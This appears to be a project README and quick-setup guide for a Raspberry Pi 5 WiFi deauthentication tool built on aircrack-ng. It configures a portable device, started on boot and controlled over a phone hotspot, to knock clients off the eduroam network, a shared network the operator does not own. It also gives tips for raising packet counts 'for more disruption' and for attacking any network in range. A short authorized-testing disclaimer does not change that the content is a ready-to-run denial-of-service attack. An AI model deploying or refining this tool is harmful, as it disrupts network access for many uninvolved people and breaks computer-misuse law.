# Quick Setup Guide for Raspberry Pi 5

## Hardware Checklist

**Required:**
- [ ] Raspberry Pi 5
- [ ] External USB WiFi adapter (RT5572/Panda PAU09, Alfa AWUS036NH, or similar)
- [ ] MicroSD card with Raspberry Pi OS
- [ ] 16x2 I2C LCD display (optional but recommended)

**WiFi Adapter Requirements:**
- Must support monitor mode
- Must support packet injection
- Tested chipsets: RT5572 (Panda PAU09), RTL8187, RT3070, Atheros AR9271

## Quick Install (5 Minutes)

### 1. System Setup
```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install required packages
sudo apt install aircrack-ng python3 python3-pip python3-smbus i2c-tools git -y

# Install Ralink firmware (for RT5572/Panda PAU09 and similar)
sudo apt install firmware-ralink -y

# Enable I2C for LCD
sudo raspi-config
# Go to: Interface Options → I2C → Enable → Reboot
```

After reboot, verify WiFi adapter:
```bash
lsusb | grep -i ralink
iwconfig
# Should see wlan0 and wlan1
```

### 2. Install This Project
```bash
cd /home/pi
git clone [your-repo-url] wifi-deauth
cd wifi-deauth

# Install Python dependencies
pip3 install -r requirements.txt

# Create dump directory
mkdir -p /home/pi/dump
```

### 3. Configure Settings

**A. Hotspot Connection** (for SSH access):
```bash
nano wpa_supplicant_hotspot.conf
```
Change:
- `ssid="myhotspotname"` → Your phone's hotspot name
- `psk="myhotspotpassword"` → Your hotspot password

**B. Target Network** (attack eduroam):
```bash
nano attack.py
```
Find and verify:
```python
target_essid = "eduroam"  # Already set for eduroam
```

**C. Auto-start on boot:**
```bash
crontab -e
# Add this line:
@reboot bash /home/pi/wifi-deauth/startup.sh
```

### 4. Test LCD (Optional)
```bash
# Check I2C connection
sudo i2cdetect -y 1
# Should show 27 or 3F

# Test LCD
python3 lcd_display.py
```

### 5. Verify WiFi Adapter
```bash
# Plug in external WiFi adapter
iwconfig
# Should see wlan0 (built-in) and wlan1 (external)

# Check monitor mode support
sudo airmon-ng start wlan1
sudo airodump-ng wlan1
# Press Ctrl+C to stop
```

## Running the Attack

### Method 1: Direct Run (Testing)
```bash
cd /home/pi/wifi-deauth
sudo python3 attack.py
```

### Method 2: Mobile Operation (via SSH)
1. Enable phone hotspot (with credentials from step 3A)
2. Power on Raspberry Pi
3. Wait 30 seconds for boot
4. SSH from phone: `ssh pi@raspberrypi`
5. Run: `sudo python3 /home/pi/wifi-deauth/attack.py`

## What You'll See

### On Terminal:
```
=== Attack Loop 1 ===
Starting airodump-ng scan...
airodump-ng process started
Getting latest dump file
Latest dump: dump-01.csv
Found target network: eduroam (AA:BB:CC:DD:EE:FF) on channel 36, power -45
Deauthing eduroam ( AA:BB:CC:DD:EE:FF ) on channel 36 num of packets:  100 ...
```

### On LCD (if connected):
```
Line 1: Scanning
Line 2: WiFi Networks...

Line 1: Searching
Line 2: eduroam

Line 1: Attacking
Line 2: eduroam

Line 1: Loop Complete
Line 2: #1
```

## Troubleshooting

### "Target network 'eduroam' not found"
- Eduroam is not in range
- Check spelling in `attack.py`
- Test with `target_essid = None` to attack any network

### "Monitor mode not enabled"
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan1
```

### LCD shows nothing
- Check wiring: SDA→GPIO2, SCL→GPIO3, VCC→5V, GND→GND
- Run: `sudo i2cdetect -y 1`
- Try changing address to 0x3F in lcd_display.py

### Can't SSH to Pi
- Verify hotspot is enabled on phone
- Try: `ssh pi@192.168.x.x` (check router for IP)
- Default password: `raspberry` (change this!)

## Performance Tips

1. **Increase attack intensity:**
   ```python
   deauth_num_pkts = 500  # More packets = more disruption
   ```

2. **Target multiple APs:**
   ```python
   deauth_all = True  # Inside deauth_from_csv function
   ```

3. **Faster scanning:**
   ```python
   time.sleep(5)  # Reduce from 10 to 5 seconds
   ```

## Security Notes

**WARNING: This tool is for authorized testing only**
- Obtain written permission before testing
- Illegal to use on networks you don't own
- Can violate computer fraud laws
- Educational purposes only

## Default Configuration Summary

```python
# Current Settings (in attack.py)
target_essid = "eduroam"         # Targeting eduroam specifically
deauth_num_pkts = 100            # 100 packets per attack
iface = "wlan1"                  # External USB WiFi adapter
deauth_all = False               # Attack strongest signal only
dump_dir = "/home/pi/dump"       # CSV storage location
```

## Need Help?

1. Check main README.md for detailed documentation
2. Test LCD standalone: `python3 lcd_display.py`
3. Test WiFi adapter: `sudo airodump-ng wlan1`
4. Verify I2C: `sudo i2cdetect -y 1`
5. Check logs: `dmesg | grep -i wlan`

## Quick Command Reference

```bash
# Start attack
sudo python3 attack.py

# Stop attack
Ctrl+C

# Check WiFi interfaces
iwconfig

# Enable monitor mode manually
sudo airmon-ng start wlan1

# Test scan (see what networks are visible)
sudo airodump-ng wlan1

# Check I2C devices
sudo i2cdetect -y 1

# View collected data
cat /home/pi/dump/dump-01.csv
```

Good luck with your authorized testing.

